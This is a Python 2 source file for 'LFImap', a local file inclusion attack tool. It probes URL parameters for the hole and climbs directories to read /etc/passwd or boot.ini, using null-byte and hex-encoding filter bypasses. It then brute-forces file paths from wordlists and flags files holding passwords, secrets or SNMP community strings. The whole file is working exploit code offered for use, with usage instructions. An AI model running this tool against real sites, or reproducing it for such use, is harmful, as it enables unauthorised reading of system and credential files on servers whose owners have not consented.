import datetime
import time
import urllib2
import getopt
import sys
import re
import base64
from urlparse import urlparse
from optparse import OptionParser


def autodetect (url, us, pw, prox):
	url= str(url)
	url = urlparse (url)
	params = dict([part.split('=') for part in url[4].split('&')])
	coun =0
	count =0
        if prox <> '':
                proxy_support = urllib2.ProxyHandler({"http":prox})
                opener = urllib2.build_opener(proxy_support)
                urllib2.install_opener(opener)



	while coun <= count:
        	count=0
       		site=url[0]+'://'+url[1]+url[2]+'?'
        	for tuple in params.items():
                	count= count+1
                	if coun == count:
                        	site=site+tuple[0]+'='+'test'+'&'
                	else:
                        	site=site+tuple[0]+'='+tuple[1]+'&'
        	coun= coun+1
#        	print site[:-1]
		x = urllib2.Request(site)
		if us <> '':
                	   base64string = base64.encodestring('%s:%s' % (us, pw))[:-1]
                  	   authheader =  "Basic %s" % base64string
                   	   x.add_header("Authorization", authheader)
           		   try:
		                
                		handle = urllib2.urlopen(x)

      			   except IOError, e:

                                print "Wrong user or password."
                                sys.exit(1)

		 
		handle = urllib2.urlopen(x)
		reply = handle.read()
		filtra = reply.find("'test' for inclusion");
	       	if filtra <> -1:
                	print ' lfi detected in '+'"'+tuple[0]+'"'+' parameter'
			site= site.split('test')
                	return site
			break
			handle.close;
	exit(1)
	handle.close;



def hexaenc (url):
	encoded =''
	for char in url:
    		 encoded= encoded+"%"+hex(ord(char))[2:]
	return encoded



def usage(argv):
        print 'Type the url with local include as are showed bellow';
        print 'Example: python '+argv+' -t http://www.test.com/ss.php?page=[LFI HERE]';
        print 'Coded by Augusto Pereyra aepereyra at gmail.com'
	print "With the great colaboration of Marcos Garcia mgarcia at artsweb.com.ar"
        print "How use it:"
        print "--target, -t http://www.test.com/ss.php?page=[LFI HERE]"
        print "--null, -n Put a null byte to bypass some controls"
	print "--user, -u Is used to send username in basic authentication"
	print "--passw, -p Is used to send password in basic authentication"
	print "--proxy, -w Proxy support"
	print "--output, -o Set Output file"
	print "--hexa, -x encode the url to hexa"


def detroot (urlt, us, pw, prox, out_f):
	count = 0
	print '--------------------------------------------------------------------'
	print 'Made by Augusto Pereyra'
        print "Thanks to www.artsweb.com.ar"
	print "This code is distributed under GPL Licence"
	print 'Detecting root path of site';
	print '--------------------------------------------------------------------'
	print ''
	print ''
	if prox <> '':
		proxy_support = urllib2.ProxyHandler({"http":prox})
        	opener = urllib2.build_opener(proxy_support)
		urllib2.install_opener(opener)

       	while True:
	   print 'Going down '+str(count)+' folder'
	   path= '../'*count
	   if hexa == '1':
                pathtstln = hexaenc (path+'etc/passwd')
                roodet = urlt[0]+pathtstln+urlt[1]+nul;
		   	
	   else:
		roodet= urlt[0]+path+'etc/passwd'+urlt[1]+nul;

	   p = urllib2.Request(roodet)
	   try:
	   	
		if us <> '':
			base64string = base64.encodestring('%s:%s' % (us, pw))[:-1]
			authheader =  "Basic %s" % base64string
			p.add_header("Authorization", authheader)
		try:
    			handle = urllib2.urlopen(p)
		except IOError, e:
   
    			print "Wrong user or password."
    			sys.exit(1)
		reply = handle.read()


	   	
 	   except IOError, e:
	    	   if hasattr(e, 'code'):
        		if e.code == 401:
				print "root path finded in: "
                       		print '-------------------------------------------------------------'
                        	print urlt[0]+path+urlt[1]
                        	print " The root of the File system was found "+str(count)+" levels down"
                        	print " Not enough user right"
				print " This is a Linux System"
                 		print '-------------------------------------------------------------'
                 		os = 'lnx'
				now = datetime.datetime.now()
        			if out_f <> '':
					out_file = open(out_f,"a")
					out_file.write ('<html>')
					out_file.write ('<head>')
					out_file.write ('<title>LFImap Report </title>')
					out_file.write ('</head>')
					out_file.write ('<body>')
					out_file.write (str(now))
					out_file.write("\n")                 
					out_file.write("This is a Linux System \n")
                 			out_file.close()
				return path, os
                		
                 		break




	   count = count + 1
	   filtra = reply.find('0:root');
	   
	   if filtra <> -1:
     		 print "root path finded in: "
     		 print '-------------------------------------------------------------'
      		 print urlt[0]+path+urlt[1]
      		 print " The root of the File system was found "+str(count)+" levels down"
		 print " This is a Linux System"
      		 print '-------------------------------------------------------------'
                 now = datetime.datetime.now()
                 print now
		 os = 'lnx'
         	 if out_f <> '':
			out_file = open(out_f,"a")
	         	out_file.write (str(now))
		 	out_file.write("\n")
         	 	out_file.write("This is a Linux System \n")
        	 	out_file.close()
      		 
                 return path, os 
		 break
	   else:
     		 handle.close;
     		 if count > 10:

			print "--------------------------------------------------------"
			print " Trying windows paths "
			print "--------------------------------------------------------"
			count = 0
	     		while True:
				
 	      		 	print 'Going down '+str(count)+' folder'
           			path= '../'*count
				if hexa == '1':
			                pathtstln = hexaenc (path+'boot.ini')
          				roodet = urlt[0]+pathtstln+url[1]+nul;
					
				else:				
					roodet= urlt[0]+path+'boot.ini'+urlt[1]+nul;
				
				p = urllib2.Request(roodet)

				if us <> '':
		                	base64string = base64.encodestring('%s:%s' % (us, pw))[:-1]
                			authheader =  "Basic %s" % base64string
                			p.add_header("Authorization", authheader)
                		try:
                        		handle = urllib2.urlopen(p)
                		except IOError, e:

                        		print "Wrong user or password."
                        		sys.exit(1)
                		reply = handle.read()

         			
           			count = count + 1
         			filtra = reply.find('loader');
			        
				if filtra <> -1:
                			 print "root path finded in: "
                			 print '-------------------------------------------------------------'
                 			 print url+path
             				 print " The root of the File system was found "+str(count-1)+" levels down"
                 			 print " This is a Windows System" 
					 print '-------------------------------------------------------------'
                 			 now = datetime.datetime.now()
                                         print now
					 os = 'win'
					 if out_f <> '':
					 	out_file = open(out_f,"a")
                 			 	out_file.write (str(now))
	 					out_file.write("\n")
					 	out_file.write("This is a Windows System \n")
        			         	out_file.close()
					 
					 return path, os
                 			 break
           			else:
                 		        handle.close;
                 		 	if count > 10:
                         			print 'path not found'
                        			sys.exit(0)
 
			

	
	
def brute (urlt, path, os, us, pw, prox, out_f, cusre):
		
	if os == 'lnx':
		f = open("linux_test.dat","r");
	if os == 'win':
		f = open("win_test.dat","r");

	if out_f <> '':
		out_file = open(out_f,"a")
		out_file.write("\n")
	
	if prox <> '':
		proxy_support = urllib2.ProxyHandler({"http":prox})
		opener = urllib2.build_opener(proxy_support)
		urllib2.install_opener(opener)

	while True:
  	   testline = f.readline().rstrip()
  	   if hexa == '1':
		pathtstln = hexaenc (path+testline)
           	site = urlt[0]+pathtstln+urlt[1]+nul;
	   else:
	   	site = urlt[0]+path+testline+urlt[1]+nul;
	   g = urllib2.Request(site)
	   if us <> '':
		   base64string = base64.encodestring('%s:%s' % (us, pw))[:-1]
        	   authheader =  "Basic %s" % base64string
          	   g.add_header("Authorization", authheader)
           try:
               	handle = urllib2.urlopen(g)
           except IOError, e:
                print "Wrong user or password."
                sys.exit(1)
              	   
       	   reply = handle.read()
	   

	   if cusre <> '':
		respuesta= cusre
	   else:
		respuesta= "'"+path+testline+"'"


	   
   	   filtra2 = reply.find(respuesta);

	   word_list = ["password", "community", "secret"]
	   	   	   	   	      	   	   
	   if filtra2 == -1:
      			print "File Found: "
			if out_f <> '':	
   	        		out_file.write("========================================================================\n")
     				out_file.write('<a href='+site+'>'+urlt[0]+path+testline+urlt[1]+'</a><br>')
				out_file.write("\n")

			t = [(word, reply.find(word)) for word in word_list]				

			print site
			for i in range(len(t)):
		
				b2 = -1 in t[i]
     		
				if str(b2) <> 'True':
					if out_f <> '':	
           					out_file.write("Possible password detected in this file!\n")	
					print ("Possible password detected in this file")
					break
								
      			print '=============================================================='
   	        	handle.close;
   	   if len(testline) == 0:
       		 break
  	         if out_f <> '':
			 out_file.write('</body>')
			 out_file.write('</html>')
			 out_file.close()

		 return


parser = OptionParser()
parser.add_option("-t", "--target", help="Url to scan", dest="page")
parser.add_option("-n", "--null", help="Put a null byte to bypass some controls",action="store_const", const=1, dest="verbose")
parser.add_option("-u", "--user", help="Give it a valid username to the tool ", dest="user")
parser.add_option("-p", "--pass", help="Give it a valid password to the tool", dest="passw")
parser.add_option("-w", "--proxy", help=" Proxy Support Ex. http://proxy:80", dest="proxyl")
parser.add_option("-o", "--output", help=" Used to set output file", dest="salida")
parser.add_option("-x", "--hexa", help=" Used to encode every request to hexa ",action="store_const", const=1, dest="hexae")
parser.add_option("-c", "--customrep", help=" This option is used to set what you need detect to help the app to do his work", dest="cusresp")
(options, args) = parser.parse_args()

if options.page:
        url = options.page
else:
        usage (sys.argv[0])
	sys.exit(0) 

if options.verbose == 1:
        nul ='%00'
else:
        nul =''

if options.cusresp:
	cusre=options.cusresp
else:
	cusre=''


if options.hexae == 1:
        hexa ='1'
else:
        hexa =''


if options.salida:
        out_f= options.salida
else:
        out_f= ''

if options.user:
        us= options.user
else:
        us= ''

if options.passw:
        pw= options.passw
else:
        pw=''


if options.proxyl:
        prox= options.proxyl
else:
        prox=''


urlt= autodetect (url, us, pw, prox)        
path, os = detroot (urlt, us, pw, prox, out_f)
brute (urlt, path, os, us, pw, prox, out_f, cusre)
